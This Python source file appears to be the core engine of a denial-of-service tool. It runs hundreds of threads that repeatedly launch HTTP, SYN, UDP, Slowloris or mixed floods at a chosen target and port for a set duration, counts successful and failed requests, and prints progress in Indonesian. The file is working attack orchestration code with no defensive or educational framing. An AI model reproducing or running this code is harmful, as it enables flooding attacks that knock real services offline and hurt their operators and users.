#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
import threading
import random
import socket
import requests
from datetime import datetime
from colorama import init, Fore, Style

from .methods import Methods
from .utils import Utils

init(autoreset=True)

class AttackEngine:
    def __init__(self, config):
        self.config = config
        self.methods = Methods(config)
        self.utils = Utils()
        self.running = False
        self.total_requests = 0
        self.success = 0
        self.failed = 0
        self.threads = []
    
    def start_attack(self, method, target, port, duration):
        self.running = True
        self.total_requests = 0
        self.success = 0
        self.failed = 0
        
        thread_count = self.config.get('threads', 500)
        max_requests = self.config.get('max_requests', 100000)
        
        # Start threads
        for i in range(thread_count):
            t = threading.Thread(
                target=self._attack_worker,
                args=(method, target, port, max_requests)
            )
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        # Progress monitor
        start_time = time.time()
        while self.running:
            elapsed = time.time() - start_time
            if elapsed >= duration:
                self.running = False
                break
            
            # Print progress every 5 seconds
            if int(elapsed) % 5 == 0:
                print(f"{Fore.CYAN}[*] Progress: {int(elapsed)}s/{duration}s | Req: {self.total_requests}")
            
            time.sleep(1)
        
        # Stop all threads
        self.running = False
        
        # Wait for threads
        for t in self.threads:
            try:
                t.join(timeout=1)
            except:
                pass
        
        self.threads = []
        
        print(f"\n{Fore.GREEN}[✓] Serangan selesai!")
        print(f"{Fore.WHITE}Total Request: {Fore.GREEN}{self.total_requests}")
        print(f"{Fore.WHITE}Success: {Fore.GREEN}{self.success}")
        print(f"{Fore.WHITE}Failed: {Fore.RED}{self.failed}")
    
    def _attack_worker(self, method, target, port, max_requests):
        while self.running and self.total_requests < max_requests:
            try:
                if method == 'http':
                    success = self.methods.http_flood(target, port)
                elif method == 'syn':
                    success = self.methods.syn_flood(target, port)
                elif method == 'udp':
                    success = self.methods.udp_flood(target, port)
                elif method == 'slowloris':
                    success = self.methods.slowloris(target, port)
                elif method == 'mixed':
                    success = self.methods.mixed_attack(target, port)
                else:
                    success = False
                
                self.total_requests += 1
                if success:
                    self.success += 1
                else:
                    self.failed += 1
                
                # Small delay to avoid CPU overload
                time.sleep(self.config.get('delay', 0.001))
                
            except Exception as e:
                self.failed += 1
                continue
    
    def stop(self):
        self.running = False
